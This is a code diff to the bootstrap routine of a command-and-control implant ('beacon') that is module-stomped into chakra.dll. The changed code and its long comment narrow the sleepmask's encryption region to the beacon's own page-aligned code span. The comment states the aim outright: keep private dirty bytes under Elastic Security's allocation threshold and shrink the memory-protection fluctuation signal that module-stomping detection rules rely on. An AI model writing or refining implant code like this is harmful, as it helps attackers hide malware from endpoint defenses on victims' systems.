@@ -410,31 +410,44 @@ FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
     }
     NaxDbgx( Nax, "user32=%p gdi32=%p", hUser32, hGdi32 );
 
-    if ( Nax->Ntdll.NtQueryVirtualMemory ) {
-        MEMORY_BASIC_INFORMATION mbi;
-        MmZero( &mbi, sizeof( mbi ) );
-        if ( Nax->Ntdll.NtQueryVirtualMemory( NtCurrentProcess(), (PVOID)NaxBootstrap, 0, &mbi, sizeof( mbi ), NULL ) == 0 ) {
-            Nax->SmInfo.BeaconBase = mbi.BaseAddress;
-            Nax->SmInfo.BeaconSize = (UINT32)mbi.RegionSize;
-            NaxDbgx( Nax, "beacon region: base=%p size=0x%x", Nax->SmInfo.BeaconBase, Nax->SmInfo.BeaconSize );
-        }
-    }
-
-    /* Read stomp context tag - loader writes { magic, cleanBuf, cleanSize }
-     * at (code start + code size), right after the beacon shellcode. */
+    /* BeaconBase/BeaconSize: scope to the beacon's OWN PIC span (StartPtr..EndPtr,
+     * page-aligned) -- NOT the whole same-protection RX run from
+     * NtQueryVirtualMemory. When module-stomped into chakra.dll that call returns
+     * the entire ~6 MB chakra .text, so the sleepmask would encrypt + RX<->RW
+     * flip 6 MB per sleep: ~6 MB private dirty bytes (blows past Elastic's ~100 KB
+     * allocation_private_bytes gate that underpins the module-stomping rules) and
+     * the loudest possible fixed-address R-X->RW->R-X fluctuation signal. The
+     * beacon PIC is ~84 KB; encrypting only its pages keeps private bytes under
+     * the gate and narrows the fluctuation footprint. StartPtr/EndPtr resolve in
+     * both the stomped UDRL blob and the CRT-linked debug EXE, so this works for
+     * every lane. See LESSONS "CRTL lane -- Elastic Security fitness audit". */
     {
         extern PVOID StartPtr( void );
         extern PVOID EndPtr( void );
-        SIZE_T codeSize = (SIZE_T)( (PBYTE)EndPtr() - (PBYTE)StartPtr() );
-        PBYTE  pTag     = (PBYTE)StartPtr() + codeSize;
-        NaxDbgx( Nax, "stomp tag: start=%p end=%p codeSize=0x%zx pTag=%p magic=0x%08x",
-                 StartPtr(), EndPtr(), codeSize, pTag, *(UINT32*)pTag );
+        PBYTE  codeStart = (PBYTE) StartPtr();
+        PBYTE  codeEnd   = (PBYTE) EndPtr();
+        SIZE_T codeSize  = (SIZE_T)( codeEnd - codeStart );
+
+        /* page-align: base rounded down, end rounded up, to cover [codeStart,codeEnd) */
+        PBYTE  beaconBase = (PBYTE)( (UINT_PTR)codeStart & ~((UINT_PTR)NAX_PAGE_MASK) );
+        PBYTE  beaconEnd  = (PBYTE)( ((UINT_PTR)codeEnd + NAX_PAGE_MASK) & ~((UINT_PTR)NAX_PAGE_MASK) );
+        Nax->SmInfo.BeaconBase = (PVOID) beaconBase;
+        Nax->SmInfo.BeaconSize  = (UINT32)( beaconEnd - beaconBase );
+        NaxDbgx( Nax, "beacon region (scoped): codeStart=%p codeEnd=%p codeSize=0x%zx -> base=%p size=0x%x",
+                 codeStart, codeEnd, codeSize, Nax->SmInfo.BeaconBase, Nax->SmInfo.BeaconSize );
+
+        /* Read stomp context tag - loader writes { magic, cleanBuf, cleanSize }
+         * at (code start + code size), right after the beacon shellcode. The tag
+         * is consumed once here; the page-aligned span above may cover a few tag
+         * bytes -- harmless, the tag is not re-read at runtime. */
+        PBYTE  pTag = codeStart + codeSize;
+        NaxDbgx( Nax, "stomp tag: pTag=%p magic=0x%08x", pTag, *(UINT32*)pTag );
         if ( *(UINT32*)pTag == NAX_STOMP_CTX_MAGIC ) {
             Nax->SmInfo.CleanTextBuf  = *(PVOID*)( pTag + sizeof( UINT32 ) );
             Nax->SmInfo.CleanTextSize = *(UINT32*)( pTag + sizeof( UINT32 ) + sizeof( PVOID ) );
             NaxDbgx( Nax, "clean text: buf=%p size=0x%x", Nax->SmInfo.CleanTextBuf, Nax->SmInfo.CleanTextSize );
         } else {
-            NaxDbgx( Nax, "stomp tag NOT FOUND: bytes at pTag: %02x %02x %02x %02x %02x %02x %02x %02x",
+            NaxDbgx( Nax, "stomp tag NOT FOUND (debug EXE / no UDRL tag): bytes at pTag: %02x %02x %02x %02x %02x %02x %02x %02x",
                      pTag[0], pTag[1], pTag[2], pTag[3], pTag[4], pTag[5], pTag[6], pTag[7] );
         }
     }
